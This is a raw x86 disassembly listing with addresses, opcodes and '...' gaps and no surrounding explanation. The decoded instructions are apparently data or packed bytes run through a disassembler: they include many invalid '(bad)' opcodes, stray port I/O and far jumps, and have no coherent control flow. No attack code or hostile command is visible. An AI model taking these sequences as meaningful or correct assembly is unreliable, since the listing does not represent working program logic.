  421fda:	mov    ds:0xe901be2b,eax
  421fdf:	fs jp  0x422055
  421fe2:	sbb    BYTE PTR [esi],0x16
  421fe5:	pop    ebx
  421fe6:	mov    edi,0x432a0ab2
  421feb:	out    dx,al
  421fec:	mov    edi,0xb5
	...
  422055:	add    BYTE PTR [ebx+0x6],ch
  422058:	(bad)  
  422059:	dec    edi
  42205a:	out    dx,eax
  42205b:	iret   
  42205c:	jmp    0x422084
  42205e:	aas    
  42205f:	in     eax,dx
  422060:	push   es
  422061:	xchg   WORD PTR [ebp+0x39],di
  422065:	das    
  422066:	ins    DWORD PTR es:[di],dx
  422068:	add    DWORD PTR [eax],eax
  42206a:	add    BYTE PTR [ecx],al
  42206c:	add    BYTE PTR [eax],al
  42206e:	mov    ebp,0x7081353e
  422073:	lahf   
  422074:	fdiv   st(2),st
  422076:	(bad)  
  422077:	punpcklbw mm7,DWORD PTR [esi-0x56]
  42207b:	mov    al,ds:0x603fd59c
  422080:	fimul  DWORD PTR [ebp+0x14a093f]
  422086:	enter  0xb740,0x4b
  42208a:	lods   eax,DWORD PTR ds:[esi]
  42208b:	test   eax,0xf630c430
  422090:	mov    BYTE PTR [eax+0x62],bl
  422093:	mov    edi,0xfa904003
  422098:	test   al,0x9c
  42209a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42209b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42209d:	(bad)  
  42209e:	into   
  42209f:	stc    
  4220a0:	shl    BYTE PTR [eax-0x62],cl
  4220a3:	cmp    DWORD PTR [ebx-0xd],0xd
  4220a7:	popf   
  4220a8:	js     0x4220aa
  4220aa:	xor    ch,BYTE PTR [eax+0xd31d202]
  4220b0:	rcr    BYTE PTR [edi+esi*1-0x777a47b5],0xa8
  4220b8:	or     DWORD PTR [ecx-0x545d7a7a],edx
  4220be:	adc    BYTE PTR [edx],ah
  4220c0:	mov    ebp,0xef9a641c
  4220c5:	adc    eax,0x17824897
  4220ca:	mov    bh,0x47
  4220cc:	loop   0x42206d
  4220ce:	imul   ecx,DWORD PTR [ebx],0x46
  4220d1:	jo     0x422118
  4220d3:	jl     0x422074
  4220d5:	retf   0x15
  4220d8:	loop   0x4220ea
  4220da:	gs push edi
  4220dc:	lods   eax,DWORD PTR ds:[esi]
  4220dd:	out    dx,al
  4220de:	mov    esi,0x5a9f671f
  4220e3:	fs je  0x422134
  4220e6:	jnp    0x422098
  4220e8:	nop
  4220e9:	std    
  4220ea:	in     al,dx
  4220eb:	xor    ecx,edx
  4220ed:	cmp    dl,bl
  4220ef:	xor    al,0x56
  4220f1:	sbb    esp,DWORD PTR [ebx]
  4220f3:	inc    DWORD PTR ds:0x65a3a144
  4220f9:	mov    cl,0xe8
  4220fb:	xor    al,0x36
  4220fd:	int    0xf7
  4220ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422100:	xor    bl,BYTE PTR [edx+0x24]
  422103:	cs jecxz 0x422093
  422106:	pop    edi
  422107:	xchg   ebp,eax
  422108:	sbb    BYTE PTR [edx+edi*8],al
  42210b:	xlat   BYTE PTR ds:[ebx]
  42210c:	or     BYTE PTR [ebp+0x5768a14c],ch
  422112:	loope  0x422112
  422114:	xchg   ebx,eax
  422115:	inc    edi
  422116:	adc    ah,BYTE PTR [ebx-0x10]
  422119:	push   ecx
  42211a:	and    BYTE PTR ds:0x8d5e2747,al
  422120:	mov    ebx,0x8fb6e6f6
  422125:	xor    edi,DWORD PTR [edx]
  422127:	enter  0xe47e,0xfa
  42212b:	ret    
  42212c:	or     BYTE PTR [edx],al
  42212e:	inc    edi
  42212f:	xor    al,0x4a
  422131:	fst    DWORD PTR [ebx-0x70]
  422134:	mov    esp,0xe3711c4d
  422139:	loope  0x42211d
  42213b:	pop    edx
  42213c:	aas    
  42213d:	cdq    
  42213e:	or     ecx,eax
  422140:	pop    es
  422141:	int    0x90
  422143:	mov    ch,0x9e
  422145:	mov    al,ds:0x4dd8ef3
  42214a:	fsubr  st(7),st
  42214c:	mov    edx,0xf7d524bd
  422151:	clc    
  422152:	dec    ecx
  422153:	jg     0x422154
  422155:	xlat   BYTE PTR ds:[ebx]
  422156:	mov    al,0x82
  422158:	xchg   ebx,eax
  422159:	and    DWORD PTR [eax+0x30],esp
  42215c:	jmp    0xad14:0x7528fe19
  422163:	inc    ebx
  422164:	retf   
  422165:	and    ch,BYTE PTR [ebp-0x29dcd8e6]
  42216b:	pop    edx
  42216c:	sub    DWORD PTR [esi],ebx
	...
  4221d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221d7:	push   edx
  4221d8:	jnp    0x4221d7
  4221da:	(bad)  
  4221db:	std    
  4221dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dd:	pop    ebx
  4221de:	dec    edx
  4221df:	sub    al,0x42
  4221e1:	sub    ebp,DWORD PTR [eax+0x672b426e]
  4221e7:	outs   dx,BYTE PTR ds:[esi]
  4221e8:	add    DWORD PTR [eax],eax
  4221ea:	add    BYTE PTR [ecx],al
  4221ec:	add    BYTE PTR [eax],al
  4221ee:	(bad)  
  4221ef:	aas    
  4221f0:	stos   DWORD PTR es:[di],eax
  4221f2:	push   esi
  4221f3:	cmp    bl,dh
  4221f5:	sbb    DWORD PTR [edi+0x21],edx
  4221f8:	pop    esp
  4221f9:	cmp    DWORD PTR [edx+0x391e5251],ebx
  4221ff:	shr    BYTE PTR [ebp-0x6a],0x19
  422203:	out    0x5b,eax
  422205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422206:	pop    edx
  422207:	dec    ecx
  422208:	mov    ds:0x53e5093e,al
  42220d:	mov    ds:0xb25cb000,al
  422212:	jecxz  0x42227f
  422214:	loopne 0x4221d6
  422216:	inc    ebp
  422217:	sub    eax,0x762bb8c8
  42221c:	lea    ebp,[esi+0x55]
  42221f:	xchg   edi,eax
  422220:	stos   DWORD PTR es:[edi],eax
  422221:	enter  0x183f,0x39
  422225:	jo     0x422284
  422227:	push   ds
  422228:	xor    DWORD PTR [eax-0x6bb57a5],esi
  42222e:	pop    es
  42222f:	and    dl,dl
  422231:	cwde   
  422232:	mov    ch,0x94
  422234:	out    dx,al
  422235:	lahf   
  422236:	pop    edx
  422237:	inc    edi
  422238:	sbb    BYTE PTR [eax+0x59ffe8da],bl
  42223e:	push   cs
  42223f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422240:	jo     0x4221e3
  422242:	test   BYTE PTR [ecx-0x692e298a],dh
  422248:	mov    ebp,edx
  42224a:	arpl   WORD PTR [ebp+eax*8-0x23],dx
  42224e:	int    0x3e
  422250:	cdq    
  422251:	pop    ecx
  422252:	test   al,0x59
  422254:	es push 0xc45ccc3e
  42225a:	pop    ss
  42225b:	add    esp,0x6e
  42225e:	scas   al,BYTE PTR es:[edi]
  42225f:	(bad)  
  422260:	sahf   
  422261:	fwait
  422262:	jmp    0x4222d2
  422264:	adc    ecx,DWORD PTR [edx-0x26]
  422267:	mov    ah,BYTE PTR [esi-0x43]
  42226a:	iret   
  42226b:	push   ds
  42226c:	scas   al,BYTE PTR es:[edi]
  42226d:	test   DWORD PTR [esp+ebx*8-0x8],0xe78966c9
  422275:	mov    ebp,0xdb79a384
  42227a:	cwde   
  42227b:	lods   al,BYTE PTR ds:[esi]
  42227c:	stc    
  42227d:	(bad)  
  42227e:	stc    
  42227f:	call   0xf85b:0xf2fea6f5
  422286:	fsub   DWORD PTR [ebp+0x40c9fb2e]
  42228c:	xchg   edi,eax
  42228d:	inc    edi
  42228e:	mov    al,0x18
  422290:	mov    cl,0xb6
  422292:	(bad)  
  422293:	leave  
  422294:	pmulhuw mm6,QWORD PTR [ecx]
  422297:	out    dx,al
  422298:	ret    
  422299:	out    dx,al
  42229a:	adc    eax,0xfe3658c3
  42229f:	add    edi,DWORD PTR [edx-0x6f101b30]
  4222a5:	das    
  4222a6:	pop    ss
  4222a7:	cdq    
  4222a8:	sar    ebx,0x75
  4222ab:	mov    DWORD PTR [ecx-0x54f2defc],0x978dd516
  4222b5:	or     al,0xf
  4222b7:	inc    esi
  4222b8:	xchg   BYTE PTR [edx-0x533ae981],dl
  4222be:	fcmovne st,st(1)
  4222c0:	fwait
  4222c1:	daa    
  4222c2:	dec    edi
  4222c3:	das    
  4222c4:	add    DWORD PTR [ebx-0x51],ebx
  4222c7:	add    edi,DWORD PTR [ecx]
  4222c9:	in     eax,dx
  4222ca:	sub    DWORD PTR [edx+0x4c89738d],edx
  4222d0:	clc    
  4222d1:	dec    esp
  4222d2:	push   esp
  4222d3:	pop    eax
  4222d4:	xchg   edx,eax
  4222d5:	pusha  
  4222d6:	xor    eax,0x365f9d4f
  4222db:	fld    DWORD PTR [esi]
  4222dd:	cmc    
  4222de:	and    dh,BYTE PTR [ebx]
  4222e0:	stc    
  4222e1:	push   eax
  4222e3:	inc    esi
  4222e4:	inc    eax
  4222e5:	(bad)  
  4222e6:	icebp  
  4222e7:	loope  0x42226f
  4222e9:	repz or edx,DWORD PTR [edx-0x24]
  4222ed:	cwde   
	...
  422356:	(bad)  
  422357:	in     eax,dx
  422358:	lods   eax,DWORD PTR ds:[esi]
  422359:	imul   edi
  42235b:	neg    edi
  42235d:	std    
  42235e:	sub    ebx,DWORD PTR [ebp+0x71]
  422361:	dec    ecx
  422362:	or     bh,0x54
  422365:	cmp    esp,DWORD PTR [edi+0x6f]
  422368:	add    DWORD PTR [eax],eax
  42236a:	add    BYTE PTR [ecx],al
  42236c:	add    BYTE PTR [eax],al
  42236e:	jno    0x422313
  422370:	mov    ds:0x2e8841ac,al
  422375:	mov    WORD PTR ds:0x75d52c71,cs
  42237b:	addr16 frndint 
  42237e:	push   0x8af3db6a
  422383:	daa    
  422384:	inc    ebp
  422385:	dec    esp
  422386:	(bad)  
  422387:	sbb    BYTE PTR [esi-0x5fb13452],0x75
  42238e:	adc    eax,0xb89689b7
  422393:	clc    
  422394:	icebp  
  422395:	and    eax,DWORD PTR [ecx-0x37]
  422398:	fistp  QWORD PTR [edx]
  42239a:	ja     0x4223af
  42239c:	pop    esi
  42239d:	data16 arpl WORD PTR [edx],bx
  4223a0:	sar    DWORD PTR [edi+0x48cd567d],1
  4223a6:	add    eax,0x7fd96401
  4223ab:	fs pushf 
  4223ad:	aad    0xf0
  4223af:	(bad)  
  4223b1:	jl     0x4223e2
  4223b3:	pop    esp
  4223b4:	rol    DWORD PTR [edi+ecx*4],0xe3
  4223b8:	into   
  4223b9:	dec    edx
  4223ba:	daa    
  4223bb:	push   esp
  4223bc:	or     eax,0xc8cbae6f
  4223c1:	stc    
  4223c2:	or     eax,0xa67e8d41
  4223c7:	cmc    
  4223c8:	retf   
  4223c9:	push   ebx
  4223ca:	addr16 jnp 0x42243b
  4223cd:	and    bh,bl
  4223cf:	pop    ss
  4223d0:	mov    al,0xb
  4223d2:	(bad)  
  4223d4:	xchg   esp,eax
  4223d5:	lea    esi,[ecx-0x41]
  4223d8:	add    eax,0x882fa932
  4223dd:	pop    edx
  4223de:	xor    edi,DWORD PTR [edx-0x397ab9da]
  4223e4:	sbb    al,0x10
  4223e6:	jmp    FWORD PTR [edi-0x79735c50]
  4223ec:	push   ss
  4223ed:	pop    ecx
  4223ee:	outs   dx,BYTE PTR ds:[esi]
  4223ef:	fisttp QWORD PTR [ecx-0x34cd967f]
  4223f5:	jno    0x42240d
  4223f7:	or     BYTE PTR [ebp+0x29fb51fd],0xf2
  4223fe:	sar    BYTE PTR [ebx-0x79],cl
  422401:	mov    dl,0x76
  422403:	enter  0x98d2,0x36
  422407:	(bad)  
  422408:	or     esp,esi
  42240a:	mov    edi,0xa06df487
  42240f:	push   eax
  422410:	out    dx,eax
  422411:	xchg   esp,eax
  422412:	fadd   QWORD PTR [edi]
  422414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422415:	clc    
  422416:	js     0x4223fd
  422418:	push   ebx
  422419:	jno    0x4223f8
  42241b:	sti    
  42241c:	push   ecx
  42241d:	test   DWORD PTR [esi+ebx*2+0x7661aa64],edx
  422424:	inc    ebp
  422425:	je     0x42245a
  422427:	icebp  
  422428:	mov    dh,BYTE PTR [edx-0x2b]
  42242b:	mov    ecx,0x6e517f1e
  422430:	push   ebx
  422431:	jmp    0x42249f
  422433:	nop
  422434:	jl     0x4223d6
  422436:	into   
  422437:	fimul  DWORD PTR [esi]
  422439:	(bad)  
  42243b:	pop    ds
  42243c:	mov    BYTE PTR [esi-0x4463190a],cl
  422442:	adc    DWORD PTR [edx-0x24],ebx
  422445:	xchg   BYTE PTR [esp+ecx*2],ch
  422448:	es stos DWORD PTR es:[edi],eax
  42244a:	call   DWORD PTR [eax+0x657b7b12]
  422450:	xchg   ebx,eax
  422451:	add    al,0x36
  422453:	fld    TBYTE PTR [ecx+0xd]
  422456:	sub    DWORD PTR [ebx],eax
  422458:	in     eax,0xff
  42245a:	jne    0x4224a0
  42245c:	fmul   QWORD PTR [ebx]
  42245e:	jle    0x422437
  422460:	lock mov edx,0x737a10ad
  422466:	xchg   ebx,eax
  422467:	push   edx
  422468:	mov    ecx,0x1207d07a
  42246d:	arpl   WORD PTR [eax],ax
	...
  4224d3:	add    BYTE PTR [eax],al
  4224d5:	add    BYTE PTR [edx-0x7e],dl
  4224d8:	cs imul edi,esi,0xbbbb57ed
  4224df:	xor    ebp,esp
  4224e1:	cdq    
  4224e2:	and    al,0xfc
  4224e4:	test   eax,0x17067a6
  4224e9:	add    BYTE PTR [eax],al
  4224eb:	add    DWORD PTR [eax],eax
  4224ed:	add    BYTE PTR [edx+eax*1],al
  4224f0:	add    ebx,esi
  4224f2:	inc    eax
  4224f3:	nop
  4224f4:	xchg   edi,eax
  4224f5:	nop
  4224f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224f7:	mov    edi,0x40a2234a
  4224fc:	daa    
  4224fd:	xor    ch,al
  4224ff:	sub    BYTE PTR ds:0xbe0bc0ef,dl
  422505:	in     al,dx
  422506:	lock (bad) 
  422508:	xchg   BYTE PTR [ebx-0x45],ah
  42250b:	xor    ebx,DWORD PTR [ebx+0x1cd2d323]
  422511:	fldenv [eax-0x2ac08a83]
  422517:	jle    0x4224bc
  422519:	xchg   esi,eax
  42251a:	in     al,dx
  42251b:	out    0xb4,al
  42251d:	jecxz  0x4224cb
  42251f:	sub    dh,cl
  422521:	jl     0x422599
  422523:	pop    edi
  422524:	add    DWORD PTR [edx],0x35882576
  42252a:	push   ebx
  42252b:	mov    bl,ah
  42252d:	mov    eax,ds:0xcfbc1e0
  422532:	sti    
  422533:	jnp    0x42251b
  422535:	fistp  WORD PTR [eax+0x70]
  422538:	dec    esi
  422539:	add    DWORD PTR ds:0x3e021013,ebp
  42253f:	cwde   
  422540:	mov    ecx,0x80eec0e0
  422545:	into   
  422546:	std    
  422547:	out    dx,eax
  422548:	inc    esp
  422549:	and    eax,0x156a0a73
  42254e:	(bad)  
  42254f:	sbb    eax,0x36aefd35
  422554:	cmp    DWORD PTR [edi],0xffffffcf
  422557:	ds jae 0x4224e7
  42255a:	sub    BYTE PTR [edi+0x36a681d2],ch
  422560:	call   0x1d4970c4
  422565:	pusha  
  422566:	pop    ebx
  422567:	mov    edi,0x4dd48c33
  42256c:	inc    eax
  42256d:	pop    edx
  42256e:	sbb    eax,0x4d3fb9c1
  422573:	out    0x94,eax
  422575:	mov    BYTE PTR [edi+0x46],0x8e
  422579:	jns    0x422571
  42257b:	or     BYTE PTR [edi-0x678b89ab],bl
  422581:	popf   
  422582:	xchg   ebp,eax
  422583:	push   cs
  422584:	jecxz  0x422509
  422586:	imul   eax,edx,0x62
  422589:	es mov bh,0xda
  42258c:	fiadd  WORD PTR [edx]
  42258e:	repnz ins DWORD PTR es:[edi],dx
  422590:	bound  edx,QWORD PTR [edx]
  422592:	add    DWORD PTR [edx+0x69017883],0x86d9d2fd
  42259c:	out    dx,eax
  42259d:	rsqrtps xmm3,XMMWORD PTR [ecx-0x36bb01ca]
  4225a4:	enter  0xa9d0,0xd
  4225a8:	jmp    0xfb4ff54e
  4225ad:	or     BYTE PTR [ebp+0x6d],bl
  4225b0:	ror    dh,cl
  4225b2:	(bad)  
  4225b3:	xchg   ebx,eax
  4225b4:	ins    DWORD PTR es:[edi],dx
  4225b5:	pop    ss
  4225b6:	pop    es
  4225b7:	push   esp
  4225b8:	pop    edx
  4225b9:	(bad)  
  4225ba:	jmp    ecx
  4225bc:	retf   0x3376
  4225bf:	jnp    0x4225e0
  4225c1:	pop    esp
  4225c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225c3:	hlt    
  4225c4:	fsub   DWORD PTR [eax-0x3d4ca28]
  4225ca:	mov    al,cs:0x62d9e646
  4225d0:	in     eax,dx
  4225d1:	adc    al,0xf9
  4225d3:	or     ecx,ebx
  4225d5:	loopne 0x4225da
  4225d7:	xor    bl,dl
  4225d9:	icebp  
  4225da:	add    eax,0xac05a284
  4225df:	loope  0x42264e
  4225e1:	jo     0x4225bc
  4225e3:	push   ds
  4225e4:	int    0xc3
  4225e6:	sahf   
  4225e7:	ss jp  0x422600
  4225ea:	adc    bl,bh
  4225ec:	pop    es
  4225ed:	mov    dl,0x0
	...
  422653:	add    BYTE PTR [eax],al
  422655:	add    BYTE PTR [edx-0x40887052],bl
  42265b:	ja     0x422657
  42265d:	out    dx,eax
  42265e:	sbb    esi,DWORD PTR [ecx-0x2d085d08]
  422664:	fadd   st(2),st
  422666:	addr16 jno 0x42266a
  422669:	add    BYTE PTR [eax],al
  42266b:	add    DWORD PTR [eax],eax
  42266d:	add    BYTE PTR [ebx],al
  42266f:	clc    
  422670:	icebp  
  422671:	jecxz  0x4226ce
  422673:	dec    esi
  422674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422675:	pop    ebx
  422676:	gs es (bad) 
  422679:	mov    al,0xed
  42267b:	fiadd  WORD PTR [ebx-0x2]
  42267e:	sub    DWORD PTR [edx-0x13],0xbaf06ce4
  422685:	int3   
  422686:	sbb    eax,DWORD PTR [eax+edx*1]
  422689:	jmp    0xf595:0x74cebf12
  422690:	and    edx,eax
  422692:	jbe    0x4226c0
  422694:	xlat   BYTE PTR ds:[ebx]
  422695:	sub    eax,0x7edd6af7
  42269a:	mov    WORD PTR [ebp+edx*1-0x68],es
  42269e:	sbb    eax,0x1a1b9d48
  4226a3:	push   ebx
  4226a4:	call   0xdee1:0xface7a50
  4226ab:	imul   esi,DWORD PTR [edi+edx*8+0x39b92128],0x4a
  4226b3:	pcmpeqw mm3,QWORD PTR [edx-0x32]
  4226b7:	push   edi
  4226b8:	mov    bl,0xa7
  4226ba:	sub    al,0x5b
  4226bc:	dec    DWORD PTR [eax-0x77]
  4226bf:	mov    ?,WORD PTR [edx-0x6b]
  4226c2:	xchg   ecx,eax
  4226c3:	xor    eax,0x12e8fc8c
  4226c8:	clc    
  4226c9:	int3   
  4226ca:	xor    esp,DWORD PTR [edx+eiz*1+0xe729ced]
  4226d1:	dec    al
  4226d3:	adc    BYTE PTR [ebp+0x444548bf],0x33
  4226da:	aad    0x7e
  4226dc:	(bad)  
  4226dd:	and    al,0x34
  4226df:	sub    DWORD PTR [ebx-0x45305b48],esp
  4226e5:	sti    
  4226e6:	js     0x422730
  4226e8:	jp     0x4226ad
  4226ea:	pop    ebx
  4226eb:	mov    bh,0x59
  4226ed:	sbb    al,0x22
  4226ef:	dec    ecx
  4226f0:	sbb    cl,BYTE PTR [esi+0x7af5ce93]
  4226f6:	fidivr WORD PTR [eax+edx*8-0x2]
  4226fa:	out    0xae,al
  4226fc:	mov    ds:0x84ad380d,al
  422701:	mov    ah,0xf5
  422703:	rcl    BYTE PTR [ebp-0x3b],0x49
  422707:	cmp    al,0x72
  422709:	mov    ah,0x8e
  42270b:	mov    WORD PTR [ecx+0x46],cs
  42270e:	sub    al,0x24
  422710:	jb     0x42272a
  422712:	adc    al,0x3d
  422714:	test   DWORD PTR [edx],ebp
  422716:	arpl   bp,dx
  422718:	mov    ds:0x993e3f65,eax
  42271d:	test   al,0x46
  42271f:	sbb    al,0x32
  422721:	mov    bh,0x62
  422723:	xor    esi,eax
  422725:	push   esi
  422726:	adc    esp,esi
  422728:	push   edi
  422729:	out    0xf,eax
  42272b:	or     bh,BYTE PTR [ebp-0x6b]
  42272e:	stc    
  42272f:	inc    esi
  422730:	mov    ebx,0x5f131004
  422735:	sbb    cl,BYTE PTR [ebx]
  422737:	fiadd  WORD PTR [eax-0x4]
  42273a:	cwde   
  42273b:	imul   edx,DWORD PTR [esp+edx*1],0x2d
  42273f:	xor    esi,DWORD PTR [ecx]
  422741:	push   cs
  422742:	xor    DWORD PTR [edi+0x64],ebx
  422745:	lds    ebx,FWORD PTR [ebx+0x59]
  422748:	stos   BYTE PTR es:[edi],al
  422749:	js     0x422785
  42274b:	scas   eax,DWORD PTR es:[edi]
  42274c:	pop    edi
  42274d:	enter  0x5636,0x33
  422751:	cmp    BYTE PTR [edx+edi*8],bl
  422754:	ror    DWORD PTR [ebp-0x7a],0x9b
  422758:	pusha  
  422759:	dec    DWORD PTR ds:0x453acb28
  42275f:	push   eax
  422760:	js     0x422779
  422762:	push   edx
  422763:	xchg   ebp,eax
  422764:	and    dl,BYTE PTR gs:[ecx]
  422767:	lods   eax,DWORD PTR ds:[esi]
  422768:	repz pop ecx
  42276a:	sub    DWORD PTR [ecx+edx*4+0xfb],ecx
	...
  4227d5:	add    BYTE PTR [edi],ah
  4227d7:	sub    eax,0x7d7f2d7d
  4227dc:	ja     0x42280d
  4227de:	mov    esi,0xf7f01c8
  4227e3:	jnp    0x422805
  4227e5:	dec    ecx
  4227e6:	addr16 jb 0x4227ea
  4227e9:	add    BYTE PTR [eax],al
  4227eb:	add    DWORD PTR [eax],eax
  4227ed:	add    BYTE PTR [ebx-0x47],cl
  4227f0:	stc    
  4227f1:	in     al,dx
  4227f2:	out    0x45,eax
  4227f4:	in     eax,0x69
  4227f6:	jbe    0x4227e3
  4227f8:	stos   BYTE PTR es:[edi],al
  4227f9:	outs   dx,BYTE PTR ds:[esi]
  4227fa:	xchg   ebx,eax
  4227fb:	outs   dx,BYTE PTR gs:[esi]
  4227fd:	cmp    al,0x83
  4227ff:	pop    ecx
  422800:	fwait
  422801:	mov    al,BYTE PTR [ecx]
  422803:	inc    esi
  422804:	pop    ebp
  422805:	fnstenv [ecx]
  422807:	and    BYTE PTR [ecx],bh
  422809:	ror    BYTE PTR [ebp+0x22],cl
  42280c:	addr16 mov eax,ds:0x227d
  422810:	sbb    BYTE PTR [esi+0x1c],bl
  422813:	xor    al,0xf3
  422815:	dec    esp
  422816:	sbb    DWORD PTR [edi-0x54],ebp
  422819:	and    eax,0x3d7e686e
  42281e:	popa   
  42281f:	xchg   edx,eax
  422820:	xchg   esi,eax
  422821:	cmp    eax,edx
  422823:	cmp    eax,0xd02a7aec
  422828:	and    eax,0xb94f4ff5
  42282d:	jo     0x422868
  42282f:	sub    DWORD PTR [edx+0x1b3ce9b9],eax
  422835:	call   0x8555:0xd463de31
  42283c:	cmc    
  42283d:	lea    eax,[esi]
  42283f:	add    eax,0xc5433a2a
  422844:	popf   
  422845:	mov    edi,0xfff99f87
  42284a:	lds    edx,FWORD PTR [esi+0x2]
  42284d:	(bad)  
  42284e:	adc    eax,DWORD PTR [ecx]
  422850:	push   es
  422851:	cld    
  422852:	cdq    
  422853:	xchg   esi,eax
  422854:	cmp    al,0x29
  422856:	ror    BYTE PTR [edi+0x56],0x3d
  42285a:	or     BYTE PTR [edi+ebp*2],cl
  42285d:	and    esp,DWORD PTR [ebx-0x6b]
  422860:	mov    BYTE PTR [edi-0x4d348515],cl
  422866:	(bad)  
  422867:	sbb    bh,bh
  422869:	and    esi,DWORD PTR [eax-0x5a]
  42286c:	call   0x46539224
  422871:	ins    DWORD PTR es:[edi],dx
  422872:	and    bh,dl
  422874:	sbb    bh,BYTE PTR [edi+0x4814e5ff]
  42287a:	cmp    BYTE PTR [edx+0x6f],0xea
  42287e:	dec    edx
  42287f:	dec    ecx
  422880:	cmp    BYTE PTR [eax],ch
  422882:	das    
  422883:	ins    DWORD PTR es:[edi],dx
  422884:	inc    edi
  422885:	cmp    DWORD PTR [eax],eax
  422887:	push   0x18b727f8
  42288c:	lahf   
  42288d:	adc    BYTE PTR [ebx+0x32],ch
  422890:	mov    esi,0xfaa210d6
  422895:	call   0x51b226ec
  42289a:	push   es
  42289b:	stc    
  42289c:	aam    0xf3
  42289e:	icebp  
  42289f:	fnstsw WORD PTR [edi]
  4228a1:	mov    dh,0x2
  4228a3:	aaa    
  4228a4:	or     BYTE PTR [edx+ecx*4-0x44],bh
  4228a8:	les    esp,FWORD PTR [edx-0x70e77579]
  4228ae:	xor    BYTE PTR [edx],ah
  4228b0:	test   cl,dl
  4228b2:	and    ah,BYTE PTR [esi-0x57]
  4228b5:	les    ecx,FWORD PTR [edi]
  4228b7:	or     esi,ebp
  4228b9:	jns    0x4228ae
  4228bb:	push   0x495fac59
  4228c0:	sub    DWORD PTR [esi+0x726a91f6],ebp
  4228c6:	(bad)  
  4228c7:	xchg   edx,eax
  4228c8:	les    edi,FWORD PTR ds:0x11085d12
  4228ce:	std    
  4228cf:	xchg   edx,eax
  4228d0:	mov    esi,DWORD PTR ds:0xba17a199
  4228d6:	popa   
  4228d7:	pop    edi
  4228d8:	shr    DWORD PTR [ebp+0x32c6fde6],cl
  4228de:	push   ss
  4228df:	sub    eax,0x7b3e31fe
  4228e4:	clc    
  4228e5:	fbld   TBYTE PTR [edx]
  4228e7:	xor    BYTE PTR [ebx],dl
  4228e9:	push   cs
  4228ea:	or     al,0x80
  4228ec:	xor    BYTE PTR [ebp+0x0],ch
	...
  422956:	int    0x39
  422958:	mov    eax,0xef97fc97
  42295d:	jnp    0x42291d
  42295f:	outs   dx,DWORD PTR ds:[esi]
  422960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422961:	loopne 0x4228fe
  422963:	std    
  422964:	mov    ds:0x173677b,eax
  422969:	add    BYTE PTR [eax],al
  42296b:	add    DWORD PTR [eax],eax
  42296d:	add    BYTE PTR [ecx],cl
  42296f:	push   0xffffff82
  422971:	sub    dh,ah
  422973:	sbb    al,0xd6
  422975:	lea    esp,[esi+0x7b12dcbc]
  42297b:	mov    ecx,0xc630c979
  422980:	leave  
  422981:	sbb    bh,ah
  422983:	inc    esp
  422984:	dec    edi
  422985:	cmc    
  422986:	or     al,0xc2
  422988:	or     ch,BYTE PTR [ecx+0x47]
  42298b:	adc    DWORD PTR [edi+0x5f],ecx
  42298e:	xlat   BYTE PTR ds:[ebx]
  42298f:	fcomp  QWORD PTR [ebx+edx*8+0x13cb7b8c]
  422996:	loopne 0x4229bf
  422998:	push   esi
  422999:	mov    esp,0xb4604b0f
  42299e:	or     esi,ecx
  4229a0:	adc    eax,0xfeab76aa
  4229a5:	(bad)  
  4229a7:	imul   esp,DWORD PTR [ebx],0x182be7b6
  4229ad:	test   eax,0x4c26f4d5
  4229b2:	outs   dx,BYTE PTR ds:[esi]
  4229b3:	mov    ebp,0xb8cfdd03
  4229b8:	mov    ds:0x49cb5cc2,al
  4229bd:	push   esp
  4229be:	addr16 daa 
  4229c0:	stos   BYTE PTR es:[edi],al
  4229c1:	dec    esp
  4229c2:	out    dx,eax
  4229c3:	(bad)  
  4229c4:	cmc    
  4229c5:	(bad)  
  4229c6:	mov    ecx,0x311e7d16
  4229cb:	shr    DWORD PTR [esi-0x53a2761e],1
  4229d1:	sub    eax,0x90ee8d37
  4229d6:	and    DWORD PTR [edi+0x10451e2],esp
  4229dc:	push   ebx
  4229dd:	jb     0x422990
  4229df:	shl    BYTE PTR ds:0xa53ed2a1,0x32
  4229e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229e7:	cmp    ah,BYTE PTR fs:[esi+esi*4]
  4229eb:	and    ah,bh
  4229ed:	lds    ecx,FWORD PTR [ebp+0xa063a0a]
  4229f3:	or     al,BYTE PTR [ecx+0x52]
  4229f6:	sbb    BYTE PTR ss:[esi],ah
  4229f9:	mov    esi,0xd739f05e
  4229fe:	jmp    0x74a220d0
  422a03:	xchg   ecx,eax
  422a04:	loope  0x422986
  422a06:	into   
  422a07:	or     al,0x5f
  422a09:	ins    DWORD PTR es:[edi],dx
  422a0a:	pusha  
  422a0b:	loop   0x42299f
  422a0d:	and    eax,0x55c1f978
  422a12:	(bad)  
  422a13:	cmp    ch,BYTE PTR [ebp-0x4cd972ae]
  422a19:	mov    esp,0xcfbc3506
  422a1e:	push   edx
  422a1f:	cld    
  422a20:	outs   dx,DWORD PTR ds:[esi]
  422a21:	gs shr ebp,1
  422a24:	cmp    BYTE PTR [ecx+0x69],al
  422a27:	in     al,0x51
  422a29:	fst    QWORD PTR [esi-0x62088eff]
  422a2f:	cmp    dl,BYTE PTR [edx]
  422a31:	enter  0x7759,0x49
  422a35:	gs je  0x4229b9
  422a38:	pop    ebp
  422a39:	or     eax,0x778e96e6
  422a3e:	mov    al,ds:0x86c80fb5
  422a43:	mov    edi,0xe9e52f5c
  422a48:	adc    BYTE PTR [ecx+edx*1-0x7b841646],bl
  422a4f:	sub    al,0xea
  422a51:	push   0x5b
  422a53:	or     al,cl
  422a55:	mov    eax,ds:0xfa10db11
  422a5a:	in     eax,dx
  422a5b:	push   ss
  422a5c:	push   esi
  422a5d:	cdq    
  422a5e:	dec    eax
  422a5f:	daa    
  422a60:	mov    bh,0xdf
  422a62:	sbb    cl,BYTE PTR [ebp-0x40c84c47]
  422a68:	sbb    al,0xd6
  422a6a:	add    ebx,ebp
  422a6c:	cli    
  422a6d:	lds    eax,FWORD PTR [eax]
	...
